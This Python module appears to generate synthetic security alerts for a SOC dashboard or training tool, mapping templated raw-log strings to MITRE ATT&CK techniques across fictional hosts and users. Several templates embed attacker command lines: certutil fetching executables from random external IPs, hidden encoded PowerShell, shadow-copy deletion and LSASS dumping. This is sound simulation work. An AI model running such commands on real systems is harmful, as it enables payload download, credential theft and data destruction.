import random
import uuid
from datetime import datetime, timedelta

HOSTS = [
    ("WKSTN-FIN-014", "10.12.4.14", "j.martinez"),
    ("WKSTN-HR-002", "10.12.6.22", "s.chen"),
    ("WKSTN-ENG-091", "10.12.2.91", "a.kapoor"),
    ("SRV-WEB-01", "10.12.0.10", "svc_web"),
    ("SRV-DC-01", "10.12.0.1", "svc_dc"),
    ("SRV-FILE-02", "10.12.0.22", "svc_file"),
    ("WKSTN-SALES-033", "10.12.5.33", "r.owens"),
    ("WKSTN-EXEC-005", "10.12.7.5", "m.delgado"),
    ("SRV-APP-03", "10.12.0.33", "svc_app"),
    ("WKSTN-IT-019", "10.12.3.19", "t.brooks"),
]

SEVERITY_BY_TACTIC = {
    "Initial Access": "High", "Execution": "Medium", "Persistence": "High",
    "Privilege Escalation": "High", "Defense Evasion": "Medium",
    "Credential Access": "Critical", "Discovery": "Low", "Lateral Movement": "High",
    "Collection": "Medium", "Command and Control": "Critical",
    "Exfiltration": "Critical", "Impact": "Critical",
}

STATUS_WEIGHTS = [("New", 0.35), ("Investigating", 0.25), ("Escalated", 0.1),
                   ("Resolved", 0.2), ("False Positive", 0.1)]

# (technique_id, alert_name, raw_log_template, ioc_type, ioc_value_fn)
ALERT_TEMPLATES = [
    ("T1566.001", "Suspicious Email Attachment Detonated",
     "Mail gateway flagged inbound message with macro-enabled attachment '{ioc}' from external sender billing@invoice-update[.]com",
     "filename", lambda: random.choice(["Invoice_2847.docm", "Q3_Statement.xlsm", "Remittance.docm"])),
    ("T1204.002", "User Executed Malicious Downloaded File",
     "EDR observed user execution of '{ioc}' from Downloads folder shortly after browsing to a suspicious domain",
     "filename", lambda: random.choice(["setup_update.exe", "invoice_viewer.exe", "flashplayer_install.exe"])),
    ("T1059.001", "Suspicious PowerShell Execution Detected",
     "EDR alert: powershell.exe executed with command line 'powershell -nop -w hidden -enc {ioc}'",
     "command", lambda: uuid.uuid4().hex[:24].upper()),
    ("T1059.003", "Anomalous Command Shell Activity",
     "cmd.exe spawned chained command: 'whoami & net user & certutil -urlcache -f {ioc} out.exe'",
     "url", lambda: f"http://185.220.{random.randint(10,99)}.{random.randint(2,254)}/p.exe"),
    ("T1053.005", "New Scheduled Task Created With Unusual Binary",
     "schtasks.exe created task 'SystemHealthCheck' running binary '{ioc}' from a non-standard path",
     "filepath", lambda: r"C:\Users\Public\svhost.exe"),
    ("T1547.001", "Registry Run Key Persistence Detected",
     "Sysmon EID13: value written to HKCU\\...\\Run pointing to '{ioc}'",
     "filepath", lambda: r"C:\ProgramData\update32\upd.exe"),
    ("T1055", "Process Injection Detected in Trusted Process",
     "EDR flagged CreateRemoteThread from '{ioc}' into explorer.exe",
     "process", lambda: random.choice(["rundll32.exe", "regsvr32.exe", "mshta.exe"])),
    ("T1027", "Highly Obfuscated Script Blocked by AMSI",
     "AMSI flagged decoded PowerShell content with entropy score 7.{ioc} indicating obfuscation",
     "entropy", lambda: random.randint(1, 9)),
    ("T1003.001", "LSASS Memory Access Detected",
     "EDR blocked handle to lsass.exe (PROCESS_VM_READ) requested by '{ioc}'",
     "process", lambda: random.choice(["procdump.exe", "rundll32.exe", "taskmgr.exe (spoofed)"])),
    ("T1110.001", "Multiple Failed Login Attempts Followed by Success",
     "{ioc} failed authentication attempts against account within 4 minutes, followed by a successful logon",
     "count", lambda: random.randint(8, 45)),
    ("T1078", "Anomalous Login: Impossible Travel Detected",
     "Account logon observed from new geolocation '{ioc}' inconsistent with prior 30-day baseline",
     "geo", lambda: random.choice(["Lagos, NG", "Hanoi, VN", "Minsk, BY", "Bucharest, RO"])),
    ("T1021.001", "RDP Session From Unusual Source Host",
     "LogonType 10 (RDP) session established from '{ioc}' to target host outside normal admin activity pattern",
     "host", lambda: random.choice(["WKSTN-SALES-033", "WKSTN-EXEC-005", "10.12.9.201 (unrecognized)"])),
    ("T1021.002", "Lateral Movement via Admin Share / PsExec",
     "Service 'PSEXESVC' created (EID 7045) after SMB connection from '{ioc}' to ADMIN$ share",
     "host", lambda: random.choice(["WKSTN-IT-019", "10.12.3.19"])),
    ("T1105", "Suspicious Tool Download to Endpoint",
     "certutil.exe used to download file from '{ioc}'",
     "url", lambda: f"http://{random.choice(['45.9','193.106','91.219'])}.{random.randint(10,250)}.{random.randint(2,250)}/svc.exe"),
    ("T1071.001", "C2 Beaconing Pattern Detected",
     "Network sensor observed periodic HTTPS callbacks every ~{ioc}s to rare domain sync-cdn-update[.]net",
     "interval", lambda: random.choice([30, 60, 90, 120])),
    ("T1071.004", "DNS Tunneling Suspected",
     "High volume of high-entropy TXT queries to '{ioc}' — possible DNS-based C2/exfil channel",
     "domain", lambda: f"{uuid.uuid4().hex[:12]}.datax-relay[.]io"),
    ("T1041", "Large Outbound Data Transfer to Suspicious Endpoint",
     "{ioc} MB transferred to an external IP shortly after a compressed archive was staged in Temp",
     "size", lambda: random.randint(150, 4000)),
    ("T1486", "Mass File Encryption Activity Detected",
     "{ioc} files renamed with extension '.lockbyte' within 90 seconds on host — ransomware behavior pattern",
     "count", lambda: random.randint(200, 5000)),
    ("T1490", "Shadow Copy Deletion Command Executed",
     "vssadmin.exe executed with 'delete shadows /all /quiet' by '{ioc}'",
     "process", lambda: random.choice(["cmd.exe", "powershell.exe"])),
    ("T1505.003", "Possible Web Shell Uploaded to Web Root",
     "New file '{ioc}' written to web root via w3wp.exe, followed by command execution through the file",
     "filepath", lambda: random.choice([r"C:\inetpub\wwwroot\images\sys_cache.aspx", r"/var/www/html/uploads/x1.php"])),
]


def _weighted_status():
    r = random.random()
    cum = 0
    for status, w in STATUS_WEIGHTS:
        cum += w
        if r <= cum:
            return status
    return "New"


def generate_alerts(n=42, seed=7):
    rnd = random.Random(seed)
    random.seed(seed)
    alerts = []
    now = datetime.utcnow()
    for i in range(n):
        tid, name, log_tpl, ioc_type, ioc_fn = rnd.choice(ALERT_TEMPLATES)
        host, ip, user = rnd.choice(HOSTS)
        ioc_val = ioc_fn()
        raw_log = log_tpl.format(ioc=ioc_val)
        ts = now - timedelta(
            days=rnd.uniform(0, 6.5),
            hours=rnd.uniform(0, 23),
            minutes=rnd.uniform(0, 59),
        )
        from mitre_data import TECHNIQUES
        tactic = TECHNIQUES[tid]["tactic"]
        severity = SEVERITY_BY_TACTIC.get(tactic, "Medium")
        alerts.append({
            "id": f"ALRT-{1000 + i}",
            "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S"),
            "alert_name": name,
            "raw_log": raw_log,
            "technique_id": tid,
            "ioc_type": ioc_type,
            "ioc_value": str(ioc_val),
            "host": host,
            "host_ip": ip,
            "user": user,
            "severity": severity,
            "status": _weighted_status(),
            "analyst_notes": "",
        })
    alerts.sort(key=lambda a: a["timestamp"], reverse=True)
    return alerts

